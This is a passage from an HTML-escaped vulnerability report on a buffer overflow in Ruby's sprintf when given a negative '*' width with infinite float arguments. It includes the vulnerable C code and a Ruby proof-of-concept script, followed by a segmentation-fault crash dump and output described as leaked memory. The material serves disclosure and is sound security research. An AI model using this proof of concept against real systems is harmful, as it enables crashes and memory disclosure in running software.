class=\"s\"\u003e\u0026quot;\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n  \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eflags\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u003c/span\u003e \u003cspan class=\"n\"\u003eFMINUS\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"o\"\u003e!\u003c/span\u003e\u003cspan class=\"n\"\u003eisnan\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003efval\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\"n\"\u003efval\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;\u003c/span\u003e \u003cspan class=\"mf\"\u003e0.0\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n         \u003cspan class=\"n\"\u003ebuf\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003eblen\u003c/span\u003e\u003cspan class=\"o\"\u003e++\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"sc\"\u003e\u0026#39;-\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"k\"\u003eelse\u003c/span\u003e \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eflags\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u003c/span\u003e \u003cspan class=\"n\"\u003eFPLUS\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n         \u003cspan class=\"n\"\u003ebuf\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003eblen\u003c/span\u003e\u003cspan class=\"o\"\u003e++\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"sc\"\u003e\u0026#39;+\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"k\"\u003eelse\u003c/span\u003e \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eflags\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u003c/span\u003e \u003cspan class=\"n\"\u003eFSPACE\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n        \u003cspan class=\"n\"\u003eblen\u003c/span\u003e\u003cspan class=\"o\"\u003e++\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"n\"\u003ememcpy\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"n\"\u003ebuf\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003eblen\u003c/span\u003e\u003cspan class=\"p\"\u003e],\u003c/span\u003e \u003cspan class=\"n\"\u003eexpr\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003estrlen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eexpr\u003c/span\u003e\u003cspan class=\"p\"\u003e));\u003c/span\u003e\n  \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe following script demonstrates the damage: buffer overflow that leads to memory corruption and information leakage.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight ruby\"\u003e\u003ccode\u003e\u003cspan class=\"n\"\u003elength\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e120\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e \u003cspan class=\"mi\"\u003e4\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e \u003cspan class=\"mi\"\u003e1\u003c/span\u003e\n\u003cspan class=\"n\"\u003ebase_format\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;%*G\u0026quot;\u003c/span\u003e\n\u003cspan class=\"n\"\u003earg1\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e2\u003c/span\u003e \u003cspan class=\"o\"\u003e**\u003c/span\u003e \u003cspan class=\"mi\"\u003e31\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e \u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"n\"\u003earg2\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"mf\"\u003e1.0\u003c/span\u003e \u003cspan class=\"o\"\u003e/\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\n\n\u003cspan class=\"n\"\u003ei\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e1\u003c/span\u003e\n\n\u003cspan class=\"k\"\u003ewhile\u003c/span\u003e \u003cspan class=\"n\"\u003ei\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;\u003c/span\u003e \u003cspan class=\"mi\"\u003e10\u003c/span\u003e \u003cspan class=\"o\"\u003e**\u003c/span\u003e \u003cspan class=\"mi\"\u003e5\u003c/span\u003e  \u003cspan class=\"k\"\u003edo\u003c/span\u003e\n    \u003cspan class=\"n\"\u003es1\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003esprintf\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;1\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e \u003cspan class=\"n\"\u003elength\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"n\"\u003ebase_format\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003earg1\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003earg2\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"nb\"\u003eputs\u003c/span\u003e \u003cspan class=\"n\"\u003es1\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"mi\"\u003e5\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e10\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\n\n    \u003cspan class=\"n\"\u003es2\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003esprintf\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;2\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e \u003cspan class=\"n\"\u003elength\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"n\"\u003ebase_format\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e \u003cspan class=\"mi\"\u003e2\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003earg1\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003earg2\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003earg1\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003earg2\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"n\"\u003es2\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"mi\"\u003e20\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e20\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\n\n    \u003cspan class=\"n\"\u003es3\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003esprintf\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;3\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e \u003cspan class=\"n\"\u003elength\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"n\"\u003ebase_format\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e \u003cspan class=\"mi\"\u003e3\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003earg1\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003earg2\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003earg1\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003earg2\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003earg1\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003earg2\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"n\"\u003es3\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"mi\"\u003e20\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e20\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\n\n    \u003cspan class=\"n\"\u003es8\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003esprintf\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;8\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e \u003cspan class=\"n\"\u003elength\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"n\"\u003ebase_format\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e \u003cspan class=\"mi\"\u003e8\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003earg1\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003earg2\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003earg1\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003earg2\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003earg1\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003earg2\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003earg1\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003earg2\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003earg1\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003earg2\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003earg1\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003earg2\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003earg1\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003earg2\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003earg1\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003earg2\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"n\"\u003es8\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"mi\"\u003e20\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e20\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\n\n    \u003cspan class=\"n\"\u003ei\u003c/span\u003e \u003cspan class=\"o\"\u003e+=\u003c/span\u003e \u003cspan class=\"mi\"\u003e1\u003c/span\u003e\n\u003cspan class=\"k\"\u003eend\u003c/span\u003e\n\n\u003cspan class=\"nb\"\u003eputs\u003c/span\u003e \u003cspan class=\"n\"\u003es1\u003c/span\u003e\n\u003cspan class=\"nb\"\u003eputs\u003c/span\u003e \u003cspan class=\"n\"\u003es2\u003c/span\u003e\n\u003cspan class=\"nb\"\u003eputs\u003c/span\u003e \u003cspan class=\"n\"\u003es3\u003c/span\u003e\n\u003cspan class=\"nb\"\u003eputs\u003c/span\u003e \u003cspan class=\"n\"\u003es8\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAnd here are last parts of several outputs when running on a 64 bit machine using ruby 2.3.3 (tested on 32 bit machine running 2.4.0 too):\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e1-Inf\n1-Inf\n1-IG\n1-Inf\n1-I\n1-I\n1-Inf\n1-I\n1-Inf\n1-I\nIG *G\nInf*G\nIG%*G\nInf*G\nInf*G\nInf G\nInf*G\nInf*G\nIG *G\nInf*G\nIG *G\nInf*G\n33333\nInf11\nInff-\n\nf-Inf\n88888\nruby_poc.rb:15: [BUG] Segmentation fault\nruby 2.3.3p222 (2016-11-21 revision 56859) [x64-mingw32]\n\n-- Control frame information -----------------------------------------------\nc:0003 p:---- s:0019 e:000018 CFUNC  :sprintf\nc:0002 p:0096 s:0013 E:0018b8 EVAL   ruby_poc.rb:15 [FINISH]\nc:0001 p:0000 s:0002 E:0009a0 (none) [FINISH]\n\n-- Ruby level backtrace information ----------------------------------------\nruby_poc.rb:15:in `\u0026lt;main\u0026gt;\u0026#39;\nruby_poc.rb:15:in `sprintf\u0026#39;\n\n-- C level backtrace information -------------------------------------------\nC:\\WINDOWS\\SYSTEM32\\ntdll.dll(NtWaitForSingleObject+0x14) [0x00007FFF5FF56154]\nC:\\WINDOWS\\System32\\KERNELBASE.dll(WaitForSingleObjectEx+0x8f) [0x00007FFF5CEC3ACF]\nC:\\Ruby23-x64\\bin\\x64-msvcrt-ruby230.dll(rb_vm_bugreport+0xa4) [0x000000006E6AF354]\nC:\\Ruby23-x64\\bin\\x64-msvcrt-ruby230.dll(rb_bug_context+0x68) [0x000000006E54B6B8]\nC:\\Ruby23-x64\\bin\\x64-msvcrt-ruby230.dll(rb_check_safe_obj+0x3b2) [0x000000006E61E522]\n [0x0000000000401A85]\nC:\\WINDOWS\\SYSTEM32\\ntdll.dll(_C_specific_handler+0x96) [0x00007FFF5FF46BD6]\nC:\\WINDOWS\\SYSTEM32\\ntdll.dll(_chkstk+0x11d) [0x00007FFF5FF5AB9D]\nC:\\WINDOWS\\SYSTEM32\\ntdll.dll(RtlImageNtHeaderEx+0x483) [0x00007FFF5FEF9913]\nC:\\WINDOWS\\SYSTEM32\\ntdll.dll(KiUserExceptionDispatcher+0x3a) [0x00007FFF5FF59CBA]\nC:\\WINDOWS\\System32\\msvcrt.dll(strlen+0x31) [0x00007FFF5DE4C981]\nC:\\Ruby23-x64\\bin\\x64-msvcrt-ruby230.dll(rb_str_format+0x16ba) [0x000000006E623F6A]\nC:\\Ruby23-x64\\bin\\x64-msvcrt-ruby230.dll(rb_error_arity+0x1fb) [0x000000006E697D1B]\nC:\\Ruby23-x64\\bin\\x64-msvcrt-ruby230.dll(rb_vm_localjump_error+0xe11) [0x000000006E69E9B1]\nC:\\Ruby23-x64\\bin\\x64-msvcrt-ruby230.dll(rb_vm_localjump_error+0x5788) [0x000000006E6A3328]\nC:\\Ruby23-x64\\bin\\x64-msvcrt-ruby230.dll(rb_check_copyable+0x2dc1) [0x000000006E5509B1]\nC:\\Ruby23-x64\\bin\\x64-msvcrt-ruby230.dll(ruby_run_node+0x51) [0x000000006E553951]\n [0x0000000000402D14]\n [0x00000000004013D7]\n [0x00000000004014F8]\nC:\\WINDOWS\\System32\\KERNEL32.DLL(BaseThreadInitThunk+0x14) [0x00007FFF5FD08364]\n\n-- Other runtime information -----------------------------------------------\n\n* Loaded script: ruby_poc.rb\n\n* Loaded features:\n\n    0 enumerator.so\n    1 thread.rb\n    2 rational.so\n    3 complex.so\n    4 C:/Ruby23-x64/lib/ruby/2.3.0/x64-mingw32/enc/encdb.so\n    5 C:/Ruby23-x64/lib/ruby/2.3.0/x64-mingw32/enc/trans/transdb.so\n    6 C:/Ruby23-x64/lib/ruby/2.3.0/x64-mingw32/enc/iso_8859_8.so\n    7 C:/Ruby23-x64/lib/ruby/2.3.0/unicode_normalize.rb\n    8 C:/Ruby23-x64/lib/ruby/2.3.0/x64-mingw32/rbconfig.rb\n    9 C:/Ruby23-x64/lib/ruby/2.3.0/rubygems/compatibility.rb\n   10 C:/Ruby23-x64/lib/ruby/2.3.0/rubygems/defaults.rb\n   11 C:/Ruby23-x64/lib/ruby/2.3.0/rubygems/deprecate.rb\n   12 C:/Ruby23-x64/lib/ruby/2.3.0/rubygems/errors.rb\n   13 C:/Ruby23-x64/lib/ruby/2.3.0/rubygems/version.rb\n   14 C:/Ruby23-x64/lib/ruby/2.3.0/rubygems/requirement.rb\n   15 C:/Ruby23-x64/lib/ruby/2.3.0/rubygems/platform.rb\n   16 C:/Ruby23-x64/lib/ruby/2.3.0/rubygems/basic_specification.rb\n   17 C:/Ruby23-x64/lib/ruby/2.3.0/rubygems/stub_specification.rb\n   18 C:/Ruby23-x64/lib/ruby/2.3.0/rubygems/util/list.rb\n   19 C:/Ruby23-x64/lib/ruby/2.3.0/x64-mingw32/stringio.so\n   20 C:/Ruby23-x64/lib/ruby/2.3.0/rubygems/specification.rb\n   21 C:/Ruby23-x64/lib/ruby/2.3.0/rubygems/exceptions.rb\n   22 C:/Ruby23-x64/lib/ruby/2.3.0/rubygems/defaults/operating_system.rb\n   23 C:/Ruby23-x64/lib/ruby/2.3.0/rubygems/dependency.rb\n   24 C:/Ruby23-x64/lib/ruby/2.3.0/rubygems/core_ext/kernel_gem.rb\n   25 C:/Ruby23-x64/lib/ruby/2.3.0/monitor.rb\n   26 C:/Ruby23-x64/lib/ruby/2.3.0/rubygems/core_ext/kernel_require.rb\n   27 C:/Ruby23-x64/lib/ruby/2.3.0/rubygems.rb\n   28 C:/Ruby23-x64/lib/ruby/2.3.0/rubygems/path_support.rb\n   29 C:/Ruby23-x64/lib/ruby/gems/2.3.0/gems/did_you_mean-1.0.0/lib/did_you_mean/version.rb\n   30 C:/Ruby23-x64/lib/ruby/gems/2.3.0/gems/did_you_mean-1.0.0/lib/did_you_mean/core_ext/name_error.rb\n   31 C:/Ruby23-x64/lib/ruby/gems/2.3.0/gems/did_you_mean-1.0.0/lib/did_you_mean/levenshtein.rb\n   32 C:/Ruby23-x64/lib/ruby/gems/2.3.0/gems/did_you_mean-1.0.0/lib/did_you_mean/jaro_winkler.rb\n   33 C:/Ruby23-x64/lib/ruby/gems/2.3.0/gems/did_you_mean-1.0.0/lib/did_you_mean/spell_checkable.rb\n   34 C:/Ruby23-x64/lib/ruby/2.3.0/delegate.rb\n   35 C:/Ruby23-x64/lib/ruby/gems/2.3.0/gems/did_you_mean-1.0.0/lib/did_you_mean/spell_checkers/name_error_checkers/class_name_checker.rb\n   36 C:/Ruby23-x64/lib/ruby/gems/2.3.0/gems/did_you_mean-1.0.0/lib/did_you_mean/spell_checkers/name_error_checkers/variable_name_checker.rb\n   37 C:/Ruby23-x64/lib/ruby/gems/2.3.0/gems/did_you_mean-1.0.0/lib/did_you_mean/spell_checkers/name_error_checkers.rb\n   38 C:/Ruby23-x64/lib/ruby/gems/2.3.0/gems/did_you_mean-1.0.0/lib/did_you_mean/spell_checkers/method_name_checker.rb\n   39 C:/Ruby23-x64/lib/ruby/gems/2.3.0/gems/did_you_mean-1.0.0/lib/did_you_mean/spell_checkers/null_checker.rb\n   40 C:/Ruby23-x64/lib/ruby/gems/2.3.0/gems/did_you_mean-1.0.0/lib/did_you_mean/formatter.rb\n   41 C:/Ruby23-x64/lib/ruby/gems/2.3.0/gems/did_you_mean-1.0.0/lib/did_you_mean.rb\n\n[NOTE]\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAnd this clear information disclosure:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eInf*G\nInf*G\nIG *G\nIG%*G\nInf*G\nIG%*G\nInf*G\nInf*G\nInf*G\nIG *G\nIG *G\nInf*G\nInf*G\nInf*G\nIG%*G\nInf*G\nInf*G\nIG%*G\nIG *G\nIG *G\nIG%*G\nIG *G\nIG *G\nIG *G\nInf*G\nInf*G\nInf*G\nInf*G\nInf*G\nInf*G\nIG%*G\nInf*G\nInf*G\nInf*G\nIG%*G\nInf*G\nInf*G\nInf*G\nInf*G\nInf*G\nInf*G\nInf*G\nInf*G\nInf*G\nIG%*G\nIG *G\nIG *G\nIG%*G\nInf*G\nInf*G\nInf*G\nInf*G\nIG%*G\nIG *G\nIG *G\nInf*G\nInf*G\nInf*G\nInf*G\nInf*G\nIG%*G\nIG%*G\nIG%*G\nInf*G\n11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111-Inf*G\n22222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222-I  -I-Infnf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-\n33333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333-I  -I-Infnf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf--Inf888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888-I-Infnfnfnf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf--Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888-InfInf-Inf-Inf-\n88888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888-I  -I-Infnf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf--InfInf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf--Inf-Inf˶s�-Inf22222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222-I-Inf-Infnf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-I